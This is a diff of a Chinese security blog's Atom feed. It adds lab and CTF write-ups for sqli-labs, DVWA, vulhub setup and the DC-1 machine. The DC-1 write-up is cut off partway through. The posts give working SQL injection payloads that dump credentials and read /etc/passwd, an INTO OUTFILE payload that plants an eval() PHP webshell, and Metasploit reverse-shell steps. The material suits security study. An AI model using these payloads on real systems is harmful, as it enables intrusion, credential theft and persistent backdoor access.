@@ -6,7 +6,7 @@
   <link href="https://fogpost.top/atom.xml" rel="self"/>
   
   <link href="https://fogpost.top/"/>
-  <updated>2024-11-15T15:21:20.000Z</updated>
+  <updated>2024-11-24T09:12:52.971Z</updated>
   <id>https://fogpost.top/</id>
   
   <author>
@@ -15,6 +15,139 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqli练习</title>
+    <link href="https://fogpost.top/2024/11/24/sqli%E7%BB%83%E4%B9%A0/"/>
+    <id>https://fogpost.top/2024/11/24/sqli%E7%BB%83%E4%B9%A0/</id>
+    <published>2024-11-24T09:12:33.000Z</published>
+    <updated>2024-11-24T09:12:52.971Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="sqli开头简介"><a href="#sqli开头简介" class="headerlink" title="sqli开头简介"></a>sqli开头简介</h1><p>sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！</p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>联合查询特点：<br>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项  </p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li><li>构造联合查询?id&#x3D;-1’ union select 1,2,3–+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li></ol><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol><li>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li></ol><h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><p>?id&#x3D;1’and length((select database()))&gt;9–+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id&#x3D;1’and ascii(substr((select database()),1,1))&#x3D;115–+<br>#substr(“78909”,1,1)&#x3D;7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p><p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p><p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p><p>?id&#x3D;1’ and length((select group_concat(username,password) from users))&gt;109–+<br>判断字段内容长度<br>?id&#x3D;1’ and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50–+<br>逐一检测内容。</p><h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p><img src="https://blog.csdn.net/xiayun1995/article/details/86512290" srcset="/img/loading.gif" lazyload alt="参考文献"><br>在了解了bool盲注的基本原理之后我们发现一个问题，手工注入必然会导致时间过程，于是应运而生，我们的双查询注入可以帮助我们避免长时间的枯燥操作直接获取数据库的信息，在讲解之前我们要先了解几个函数</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>rand()：随机数函数 返回一个0到1的数<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241656811.png" srcset="/img/loading.gif" lazyload><br>floor()：向下取整，floor的向下取整可以帮我们进行去整处理，加入乘法便可以构建任意随机数选择<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241658373.png" srcset="/img/loading.gif" lazyload><br>concat()：字符串连接函数，用于连接我们查询到的数据<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241701358.png" srcset="/img/loading.gif" lazyload><br>group by：分组 as (_<em>别名)：给查询结果起别名(括号中为自定义的别名)<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241707695.png" srcset="/img/loading.gif" lazyload><br>count()：聚合函数<br>这里利用count(</em>)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241709101.png" srcset="/img/loading.gif" lazyload><br>我们这里需要的是第一次的报错，因为在实际过程中我们不可能查询到正确消息，只有在可能遇到错误时才会有返回值</p><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询：内部查询，允许把另一个查询嵌套到当前的查询中</p><blockquote><p>MariaDB [dvwa]&gt; SELECT concat(“test: “,(select database())) as a;<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241654803.png" srcset="/img/loading.gif" lazyload><br>操作开始便会先查询(select database())，然后将查询结果与”test: “连接起来，最后返回结果。</p></blockquote><p>在注入的过程中我们不了解库名库表，可以借用information_schema的库来猜测，其中information_schema.schemata中包含了mysql的所有库名，information_schema.tables中包含了所有的表名，information_schema.columns中包含了所有的列名<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241703198.png" srcset="/img/loading.gif" lazyload></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+<br>判断参数构造。<br>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+<br>判断数据库名长度</p><p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+<br>逐一判断数据库字符<br>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+<br>判断所有表名长度</p><p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+<br>逐一判断表名<br>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+<br>判断所有字段名的长度</p><p>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+<br>逐一判断字段名。<br>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+<br>判断字段内容长度</p><p>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+<br>逐一检测内容。</p><h1 id="通过sql来getshell"><a href="#通过sql来getshell" class="headerlink" title="通过sql来getshell"></a>通过sql来getshell</h1><h2 id="条件和原理"><a href="#条件和原理" class="headerlink" title="条件和原理"></a>条件和原理</h2><blockquote><p>条件：<br> root权限<br> 知道网站根目录绝对路径<br> secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）<br> gpc关闭<br>原理：<br> 写入webshell，通过参数执行系统命令，结束后删除webshell<br>附：sqlserver getshell条件和原理<br> 条件：<br>  支持外连<br>  有sa权限<br> 原理：<br>  开启xp_cmd扩展执行系统命令  </p></blockquote><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><blockquote><p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;passwd’),2%23<br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash<br>bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin<br>sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync<br>shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown<br>halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt<br>mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin<br>uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin<br>operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin<br>man:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologin<br>postmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin<br>ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin<br>sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>at:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologin<br>squid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologin<br>xfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin<br>games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin<br>cyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologin<br>vpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologin<br>ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin<br>smmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologin<br>guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin<br>www-data:x:82:82:Linux User,,,:&#x2F;home&#x2F;www-data:&#x2F;sbin&#x2F;nologin<br>mysql:x:100:101:mysql:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;sbin&#x2F;nologin<br>nginx:x:101:102:nginx:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin</p></blockquote><h2 id="读取nginx配置文件，寻找网站根目录"><a href="#读取nginx配置文件，寻找网站根目录" class="headerlink" title="读取nginx配置文件，寻找网站根目录"></a>读取nginx配置文件，寻找网站根目录</h2><blockquote><p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;nginx&#x2F;nginx.conf’),2%23<br>Array ( [0] &#x3D;&gt; Array ( [username] &#x3D;&gt; daemon off; worker_processes auto; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn; events { worker_connections 1024; } http { include &#x2F;etc&#x2F;nginx&#x2F;mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root &#x2F;var&#x2F;www&#x2F;html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location &#x2F; { try_files $uri $uri&#x2F; &#x2F;index.php?$args; } location ~ .php$ { try_files $uri &#x3D;404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } [password] &#x3D;&gt; 2 ) )</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-title function_ invoke__">Array</span><br>        (<br>            [username] =&gt; daemon off;<br><br>worker_processes  auto;<br><br>error_log  /<span class="hljs-keyword">var</span>/log/nginx/error.log warn;<br><br>events &#123;<br>    worker_connections  <span class="hljs-number">1024</span>;<br>&#125;<br><br>http &#123;<br>    <span class="hljs-keyword">include</span>       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br>    sendfile        on;<br>    keepalive_timeout  <span class="hljs-number">65</span>;<br><br>    server &#123;<br>        listen       <span class="hljs-number">80</span>;<br>        server_name  localhost;<br>        root         /<span class="hljs-keyword">var</span>/www/html;<br>        index index.php;<br><br>        proxy_set_header Host <span class="hljs-variable">$host</span>;<br>        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br><br>        location / &#123;<br>            try_files <span class="hljs-variable">$uri</span>  <span class="hljs-variable">$uri</span>/ /index.php?<span class="hljs-variable">$args</span>;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>            try_files <span class="hljs-variable">$uri</span> =<span class="hljs-number">404</span>;<br>            fastcgi_pass   <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>;<br>            fastcgi_index  index.php;<br>            <span class="hljs-keyword">include</span>        fastcgi_params;<br>            fastcgi_param  SCRIPT_FILENAME  <span class="hljs-variable">$document</span>_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br>            [password] =&gt; <span class="hljs-number">2</span><br>        )<br><br>)<br></code></pre></td></tr></table></figure><h2 id="写入php探针"><a href="#写入php探针" class="headerlink" title="写入php探针:"></a>写入php探针:</h2><blockquote><p>?id&#x3D;-1)))))) union select ‘<?php phpinfo();?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php’%23<br><a href="http://node6.anna.nssctf.cn:28413/info.php">http://node6.anna.nssctf.cn:28413/info.php</a></p></blockquote><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><blockquote><p>?id&#x3D;-1)))))) union select ‘<?php eval($_POST["cc"]);?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cc.php’%23<br>蚁剑连接：<a href="http://node6.anna.nssctf.cn:28413/cc.php">http://node6.anna.nssctf.cn:28413/cc.php</a> 密码cc</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;sqli开头简介&quot;&gt;&lt;a href=&quot;#sqli开头简介&quot; class=&quot;headerlink&quot; title=&quot;sqli开头简介&quot;&gt;&lt;/a&gt;sqli开头简介&lt;/h1&gt;&lt;p&gt;sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要</summary>
+      
+    
+    
+    
+    <category term="网络" scheme="https://fogpost.top/categories/%E7%BD%91%E7%BB%9C/"/>
+    
+    
+    <category term="sql" scheme="https://fogpost.top/tags/sql/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>dvwa全解</title>
+    <link href="https://fogpost.top/2024/11/23/dvwa%E5%85%A8%E8%A7%A3/"/>
+    <id>https://fogpost.top/2024/11/23/dvwa%E5%85%A8%E8%A7%A3/</id>
+    <published>2024-11-23T04:35:02.000Z</published>
+    <updated>2024-11-23T04:44:38.698Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>说到靶机，那么经典的dvwa靶机肯定不能错过，它是一款非常适合新手入门的靶机，它集成了多种漏洞，并且可以自由选择难度，非常适合新手入门，想玩的话自己搭建就好，我这是在服务器上搭的，用来玩玩</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>随便输入后便是这个返回值，说明密码错误<br><img src="https://gitee.com/fogpost/photo/raw/master/202411231240412.png" srcset="/img/loading.gif" lazyload><br>我们用抓包软件抓包，然后发送到repeat<br><img src="https://gitee.com/fogpost/photo/raw/master/202411231244582.png" srcset="/img/loading.gif" lazyload></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;说到靶机，那么经典的dvwa靶机肯定不能错过，它是一款非常适合新手入门的靶机，它集成了多种漏洞，并且可以自由选择难度，非常适合新手入门，想玩</summary>
+      
+    
+    
+    
+    <category term="渗透测试" scheme="https://fogpost.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+    <category term="dvwa" scheme="https://fogpost.top/tags/dvwa/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vulhub搭建</title>
+    <link href="https://fogpost.top/2024/11/21/vulhub%E6%90%AD%E5%BB%BA/"/>
+    <id>https://fogpost.top/2024/11/21/vulhub%E6%90%AD%E5%BB%BA/</id>
+    <published>2024-11-21T11:22:56.000Z</published>
+    <updated>2024-11-21T12:09:19.570Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>涉及一些经典的漏洞和靶场环境，如果有现成的可以下载固然很好，但是当需要我们自己复现和搭建环境时便会出现许多的bug，这时便需要一个较好的工具来实现便捷的靶场环境构建，这个工具便是vulhub，它是一个基于docker的漏洞环境集合，方便我们快速搭建漏洞环境，作者是p牛也是人尽皆知的离别歌，可以去看看人家的博客网</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>vulhub是个基于docker的工具平台，自行下载docker和docker-compose</p><h2 id="下载Vulhub"><a href="#下载Vulhub" class="headerlink" title="下载Vulhub"></a>下载Vulhub</h2><p>任意创建一个文件夹,从github获取对应的靶场环境,然后进入vulhub目录</p><blockquote><p>git clone <a href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a><br>cd vulhub</p></blockquote><p>随便进入一个目录,比如shiro,ls+cd进入想要的cve文件中启动docker-compose<br>即可创建靶场，注意内存资源的分配，以及部分漏洞各个工具的版本问题<br><img src="https://gitee.com/fogpost/photo/raw/master/202411211945375.png" srcset="/img/loading.gif" lazyload></p><p>搭建还是挺简单的</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;涉及一些经典的漏洞和靶场环境，如果有现成的可以下载固然很好，但是当需要我们自己复现和搭建环境时便会出现许多的bug，这时便需要一个较好的工具</summary>
+      
+    
+    
+    
+    <category term="工具" scheme="https://fogpost.top/categories/%E5%B7%A5%E5%85%B7/"/>
+    
+    
+    <category term="tool" scheme="https://fogpost.top/tags/tool/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>服务器更新计划和流程</title>
+    <link href="https://fogpost.top/2024/11/20/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9B%B4%E6%96%B0%E8%AE%A1%E5%88%92%E5%92%8C%E6%B5%81%E7%A8%8B/"/>
+    <id>https://fogpost.top/2024/11/20/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9B%B4%E6%96%B0%E8%AE%A1%E5%88%92%E5%92%8C%E6%B5%81%E7%A8%8B/</id>
+    <published>2024-11-20T09:26:30.000Z</published>
+    <updated>2024-11-20T09:26:30.000Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>DC-提权靶机</title>
+    <link href="https://fogpost.top/2024/11/19/DC-%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/"/>
+    <id>https://fogpost.top/2024/11/19/DC-%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/</id>
+    <published>2024-11-19T03:58:32.000Z</published>
+    <updated>2024-11-20T09:24:36.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>学习web怎么可以少了对靶机的攻击呢，渗透方向的学习必须要有靶机攻击的基础，前几天看到一篇文章发现DC系列正好可以来训练自己的水平和对工具的理解和使用</p><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h1><p>攻击机 kali2024.3<br>靶机 DC系列</p><h1 id="具体攻击"><a href="#具体攻击" class="headerlink" title="具体攻击"></a>具体攻击</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="目标机ip"><a href="#目标机ip" class="headerlink" title="目标机ip"></a>目标机ip</h4><p>在利用ifconfig了解知道自己的ip为192.168.56.135后利用nmap扫描同网段存活主机</p><blockquote><p>nmap -sP 192.168.56.135&#x2F;24<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191207141.png" srcset="/img/loading.gif" lazyload></p></blockquote><p>也可以利用arp-scan:</p><blockquote><p>arp-scan -l<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191209537.png" srcset="/img/loading.gif" lazyload></p></blockquote><p>获取到目标机ip为192.168.56.146</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><blockquote><p>nmap -A 192.168.56.146，详细扫描了对应的服务和版本<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191211378.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="目标访问"><a href="#目标访问" class="headerlink" title="目标访问"></a>目标访问</h4><p>我们发现存在80端口，利用web访问这个ip地址发现登录页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191214818.png" srcset="/img/loading.gif" lazyload><br>利用目录扫描工具，查看这个ip的目录文件</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>利用whatweb工具识别web服务器的指纹，在火狐上面有个好用的工具叫做wapper，也可以查看对应的cms服务，不过可能需要网速比较快才好</p><blockquote><p>whatweb -v 192.168.56.146,扫描到主要的系统版本，服务号和php版本<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191219907.png" srcset="/img/loading.gif" lazyload><br>wapper：<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191218063.png" srcset="/img/loading.gif" lazyload><br>发现CMS为Drupal，版本为7</p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>发现cms便可以尝试一下msf来使用现成的攻击模块了</p><h4 id="msfconsole获取session"><a href="#msfconsole获取session" class="headerlink" title="msfconsole获取session"></a>msfconsole获取session</h4><blockquote><p>msfconsole ，利用search命令搜索cms的漏洞<br>search Drupal<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191223407.png" srcset="/img/loading.gif" lazyload><br>发现序号为1的可以使用，我们完成设定好攻击模块的各个参数<br>use 1<br>show payloads<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191225109.png" srcset="/img/loading.gif" lazyload><br>我们发现，这些payload和前面出现的tcp端口可能有关系所以选择payload为php&#x2F;meterpreter&#x2F;reverse_tcp<br>set payload php&#x2F;meterpreter&#x2F;reverse_tcp<br>show options<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191227042.png" srcset="/img/loading.gif" lazyload><br>yes为必填大部分已经完成我们设计好攻击机ip，RHOSTS即可<br>set rhosts 192.168.56.146<br>exploit<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191229430.png" srcset="/img/loading.gif" lazyload><br>执行完成获取session  </p></blockquote><h4 id="获取shell登录sql"><a href="#获取shell登录sql" class="headerlink" title="获取shell登录sql"></a>获取shell登录sql</h4><blockquote><p>获取DC-1的信息和shell，运用python反弹，获取更好的交互<br>sysinfo shell<br>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191233860.png" srcset="/img/loading.gif" lazyload><br>ls+cat查看flag1<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191235094.png" srcset="/img/loading.gif" lazyload><br>利用find . -name “set*”查找set文件<br>发现settings文件,查看文件，发现flag和数据库信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191237652.png" srcset="/img/loading.gif" lazyload><br>使用数据库账户和密码来登录数据库<br>mysql -udbuser -pR0ck3t<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201642780.png" srcset="/img/loading.gif" lazyload><br>show databases;查看数据库<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201642468.png" srcset="/img/loading.gif" lazyload><br>use drupaldb; show tables;查看表,发现users表<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201644727.png" srcset="/img/loading.gif" lazyload><br>看表select * from users;看表结构desc users;<br>发现name和pass列<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201646673.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411201647915.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="覆盖admin密码登录"><a href="#覆盖admin密码登录" class="headerlink" title="覆盖admin密码登录"></a>覆盖admin密码登录</h4><blockquote><p>查看加密方式，搜索文件， find . -name “password*”<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201651432.png" srcset="/img/loading.gif" lazyload><br>查看password-hash.sh,发现为php加密文件，了解发现是使用 Drupal 的密码算法（基于 PBKDF2 和可配置的工作因子）生成一个加盐的安全哈希，没能力搞不懂我们用它来生成一个密码的哈希值，然后用这个哈希值去覆盖来登录<br>php  .&#x2F;scripts&#x2F;password-hash.sh  123456<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201656246.png" srcset="/img/loading.gif" lazyload><br>hash: 